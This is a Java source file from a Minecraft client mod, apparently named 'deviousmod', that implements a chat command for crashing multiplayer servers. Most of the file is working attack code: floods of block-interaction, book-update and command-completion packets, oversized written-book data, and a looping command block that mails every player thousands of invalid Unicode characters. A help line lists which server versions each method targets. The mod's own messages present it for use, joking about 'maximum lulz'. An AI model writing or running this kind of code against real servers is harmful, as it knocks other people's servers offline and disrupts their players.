package me.allink.deviousmod.commands;

import com.mojang.brigadier.exceptions.CommandSyntaxException;
import java.util.List;
import java.util.Locale;
import java.util.Objects;
import java.util.Optional;
import java.util.Random;
import java.util.Timer;
import java.util.TimerTask;
import me.allink.deviousmod.command.ChatCommandBase;
import me.allink.deviousmod.exception.NotEnoughArgumentsException;
import me.allink.deviousmod.managers.ModuleManager;
import me.allink.deviousmod.util.ChatUtil;
import me.allink.deviousmod.util.CommandBlockUtil;
import me.allink.deviousmod.util.ItemUtil;
import me.allink.deviousmod.util.Utilities;
import net.minecraft.client.MinecraftClient;
import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.nbt.NbtCompound;
import net.minecraft.nbt.NbtList;
import net.minecraft.nbt.NbtString;
import net.minecraft.nbt.StringNbtReader;
import net.minecraft.network.packet.c2s.play.BookUpdateC2SPacket;
import net.minecraft.network.packet.c2s.play.PlayerInteractBlockC2SPacket;
import net.minecraft.network.packet.c2s.play.RequestCommandCompletionsC2SPacket;
import net.minecraft.network.packet.c2s.play.UpdateSelectedSlotC2SPacket;
import net.minecraft.util.Hand;
import net.minecraft.util.hit.BlockHitResult;
import net.minecraft.util.math.BlockPos;
import net.minecraft.util.math.Direction;
import net.minecraft.util.math.Vec3d;
import org.apache.commons.compress.utils.Lists;
import org.apache.commons.lang3.RandomStringUtils;

public class CrashCommand extends ChatCommandBase {
    Utilities utilities;
    ChatUtil chatUtil;
    CommandBlockUtil commandBlockUtil;

    public CrashCommand(int minimumArguments, String command, String usage, String description, List<String> aliases) {
        super(minimumArguments, command, usage, description, aliases);
        Utilities utilities = Utilities.getInstance();
        this.chatUtil = utilities.getChatUtil();
        this.commandBlockUtil = utilities.getCommandBlockUtil();
    }


    @Override
    public void execute(String[] args) throws NotEnoughArgumentsException {
        super.execute(args);
        String type = args[0];
        MinecraftClient client = MinecraftClient.getInstance();
        Utilities utilities = Utilities.getInstance();
        ItemUtil itemUtil = utilities.getItemUtil();
        chatUtil.sendMessage(String.format("Crashing server using %s, please wait...", type));
        switch (type.toLowerCase(Locale.ROOT)) {
            case "nocompacket":
                new Thread(() -> {
                    for (int i = 0; i < 10000000; i++) {
                        try {
                            Thread.sleep(10);
                        } catch (InterruptedException e) {
                            e.printStackTrace();
                        }
                        Random random = new Random();
                        int x = random.nextInt(16777215);
                        int y = 255;
                        int z = random.nextInt(16777215);

                        Vec3d pos = new Vec3d(x, y, z);
                        PlayerInteractBlockC2SPacket packet = new PlayerInteractBlockC2SPacket(Hand.MAIN_HAND, new BlockHitResult(pos, Direction.DOWN, new BlockPos(pos), false));
                        client.getNetworkHandler().sendPacket(packet);
                    }
                }).start();

                break;
            case "nocomsign":
                chatUtil.sendMessage("FastUse has been enabled for maximum lulz.");
                ModuleManager.getModule("FastUse").toggled = true;

                String nbt = "{display:{Name:'{\"text\":\"Devious Sign\",\"color\":\"white\",\"bold\":\"false\",\"italic\":\"false\"}'}}";
                try {
                    itemUtil.giveItem("oak_sign", (byte) 1, StringNbtReader.parse(nbt));
                } catch (CommandSyntaxException e) {
                    e.printStackTrace();
                }
                break;
            case "essentials":
                commandBlockUtil.placeLooping(String.format("mail sendall %s", "\uFFFF".repeat(3180)));
                break;
            case "book":
                new Thread(() -> {
                    while (client.world != null) {
                        try {
                            Thread.sleep(50L);
                            for (int y = 0; y < 9; y++) {
                                if (client.player.isCreative()) {
                                    NbtCompound compound = new NbtCompound();
                                    NbtList pages = new NbtList();

                                    for (int i = 0; i < 100; i++) {
                                        pages.addElement(i, NbtString.of(RandomStringUtils.randomAlphanumeric(798)));
                                    }

                                    compound.putString("author", RandomStringUtils.randomAlphabetic(10));
                                    compound.putString("title", RandomStringUtils.randomAlphabetic(10));
                                    compound.putByte("resolved", (byte) 1);
                                    compound.put("pages", pages);
                                    if (client.world == null) return;
                                    itemUtil.giveItem("written_book", (byte) 1, compound, y);
                                } else {
                                    chatUtil.sendMessage("For this to work in survival mode you must have at least 1 written book. Also, this probably only works on really shitty/unpatched servers");
                                    ItemStack itemStack = client.player.getInventory().getStack(y);
                                    if (itemStack.getItem() == Items.WRITABLE_BOOK) {
                                        List<String> pages = Lists.newArrayList();

                                        for (int i = 0; i < 100; i++) {
                                            pages.add(RandomStringUtils.randomAlphanumeric(8192));
                                        }

                                        NbtList nbtList = new NbtList();
                                        Objects.requireNonNull(nbtList);
                                        for (String page : pages) {
                                            nbtList.add(NbtString.of(page));
                                        }

                                        client.player.getInventory().selectedSlot = y;
                                        client.getNetworkHandler().sendPacket(new UpdateSelectedSlotC2SPacket(y));
                                        client.getNetworkHandler().sendPacket(new BookUpdateC2SPacket(y, pages, Optional.empty()));
                                    }
                                }
                            }
                        } catch (Exception e) {
                            e.printStackTrace();
                        }
                    }
                }).start();
                break;
            case "slashandcrash":
                int ppi = 100;
                long interval = 1;

                if (args.length >= 2) {
                    try {
                        ppi = Integer.parseInt(args[1]);
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }

                if (args.length >= 3) {
                    try {
                        interval = Long.parseLong(args[2]);
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }

                long finalInterval = interval;
                int finalPpi = ppi;
                new Thread(() -> {
                    Timer t = new Timer();
                    t.schedule(new TimerTask() {
                        @Override
                        public void run() {
                            if (client.world == null) {
                                t.cancel();
                                return;
                            }
                            for (int i = 0; i < finalPpi; i++) {
                                client.getNetworkHandler().sendPacket(new RequestCommandCompletionsC2SPacket(0, "/" + RandomStringUtils.randomAlphanumeric(1)));
                            }
                        }
                    }, 0L, finalInterval);
                }).run();
                break;
            case "help":
            default:
                chatUtil.sendMessage("nocompacket (1.12.2)\nnocomsign (purpur-)\nessentials (op only)\nbook (creative, no packet limit)\nslashandcrash (no spam/chat kick limit, ty to miasmus)");
                break;
        }
    }
}
